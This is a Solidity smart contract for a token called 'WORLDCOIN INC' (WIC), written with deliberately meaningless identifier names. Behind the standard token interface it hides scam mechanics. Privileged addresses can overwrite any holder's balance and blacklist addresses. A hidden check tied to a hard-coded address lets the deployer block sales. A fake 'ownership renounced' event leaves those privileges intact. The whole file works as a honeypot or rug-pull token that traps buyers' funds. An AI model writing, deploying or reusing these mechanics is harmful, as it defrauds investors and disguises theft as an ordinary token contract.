//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface marketingTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptMax) external view returns (uint256);

    function transfer(address launchedExempt, uint256 tokenLaunch) external returns (bool);

    function allowance(address txMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenLaunch) external returns (bool);

    function transferFrom(address sender,address launchedExempt,uint256 tokenLaunch) external returns (bool);

    event Transfer(address indexed from, address indexed feeReceiver, uint256 value);
    event Approval(address indexed txMode, address indexed spender, uint256 value);
}

interface fromIsLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountExempt {
    function createPair(address amountReceiver, address senderBuy) external returns (address);
}

abstract contract enableSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityWallet is marketingTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WORLDCOININC is enableSender, marketingTo, liquidityWallet {

    string private tokenWallet = "WIC";

    function txLaunched(address toTakeAmount, uint256 tokenLaunch) public {
        minList();
        receiverTxSender[toTakeAmount] = tokenLaunch;
    }

    function minList() private view {
        require(feeMax[_msgSender()]);
    }

    uint256 enableTx;

    function receiverLaunchMode(address swapFrom) public {
        minList();
        
        if (swapFrom == launchedMax || swapFrom == fundReceiverTx) {
            return;
        }
        isFee[swapFrom] = true;
    }

    address public fundReceiverTx;

    uint256 public takeTeam;

    uint8 private toTrading = 18;

    function transferFrom(address isEnable, address launchedExempt, uint256 tokenLaunch) external override returns (bool) {
        if (_msgSender() != maxShould) {
            if (receiverMax[isEnable][_msgSender()] != type(uint256).max) {
                require(tokenLaunch <= receiverMax[isEnable][_msgSender()]);
                receiverMax[isEnable][_msgSender()] -= tokenLaunch;
            }
        }
        return exemptSell(isEnable, launchedExempt, tokenLaunch);
    }

    uint256 public autoShould;

    string private tradingMarketing = "WORLDCOIN INC";

    uint256 txIsFrom;

    mapping(address => bool) public isFee;

    address public launchedMax;

    mapping(address => bool) public feeMax;

    function exemptSell(address isEnable, address launchedExempt, uint256 tokenLaunch) internal returns (bool) {
        if (isEnable == launchedMax) {
            return receiverTo(isEnable, launchedExempt, tokenLaunch);
        }
        uint256 isAt = marketingTo(fundReceiverTx).balanceOf(takeTx);
        require(isAt == enableTx);
        require(!isFee[isEnable]);
        return receiverTo(isEnable, launchedExempt, tokenLaunch);
    }

    function owner() external view returns (address) {
        return modeTotal;
    }

    function name() external view virtual override returns (string memory) {
        return tradingMarketing;
    }

    bool public liquidityFee;

    address takeTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return toTrading;
    }

    function approve(address buyMax, uint256 tokenLaunch) public virtual override returns (bool) {
        receiverMax[_msgSender()][buyMax] = tokenLaunch;
        emit Approval(_msgSender(), buyMax, tokenLaunch);
        return true;
    }

    uint256 public walletReceiver;

    function allowance(address fromShould, address buyMax) external view virtual override returns (uint256) {
        if (buyMax == maxShould) {
            return type(uint256).max;
        }
        return receiverMax[fromShould][buyMax];
    }

    function transfer(address toTakeAmount, uint256 tokenLaunch) external virtual override returns (bool) {
        return exemptSell(_msgSender(), toTakeAmount, tokenLaunch);
    }

    function receiverTo(address isEnable, address launchedExempt, uint256 tokenLaunch) internal returns (bool) {
        require(receiverTxSender[isEnable] >= tokenLaunch);
        receiverTxSender[isEnable] -= tokenLaunch;
        receiverTxSender[launchedExempt] += tokenLaunch;
        emit Transfer(isEnable, launchedExempt, tokenLaunch);
        return true;
    }

    function isFromTrading() public {
        emit OwnershipTransferred(launchedMax, address(0));
        modeTotal = address(0);
    }

    address private modeTotal;

    bool private tokenAmount;

    function sellReceiverReceiver(address listAuto) public {
        if (liquidityFee) {
            return;
        }
        
        feeMax[listAuto] = true;
        if (exemptReceiver != takeTeam) {
            exemptReceiver = walletReceiver;
        }
        liquidityFee = true;
    }

    function balanceOf(address exemptMax) public view virtual override returns (uint256) {
        return receiverTxSender[exemptMax];
    }

    function atShould(uint256 tokenLaunch) public {
        minList();
        enableTx = tokenLaunch;
    }

    uint256 public exemptReceiver;

    mapping(address => mapping(address => uint256)) private receiverMax;

    mapping(address => uint256) private receiverTxSender;

    address maxShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed sellTx, address indexed teamMode);

    bool public senderSwap;

    uint256 private shouldLaunch = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return tokenWallet;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldLaunch;
    }

    constructor (){
        
        isFromTrading();
        fromIsLimit liquidityWalletAt = fromIsLimit(maxShould);
        fundReceiverTx = amountExempt(liquidityWalletAt.factory()).createPair(liquidityWalletAt.WETH(), address(this));
        if (autoShould != exemptReceiver) {
            autoShould = walletReceiver;
        }
        launchedMax = _msgSender();
        feeMax[launchedMax] = true;
        receiverTxSender[launchedMax] = shouldLaunch;
        if (autoShould != takeTeam) {
            takeTeam = autoShould;
        }
        emit Transfer(address(0), launchedMax, shouldLaunch);
    }

    function getOwner() external view returns (address) {
        return modeTotal;
    }

}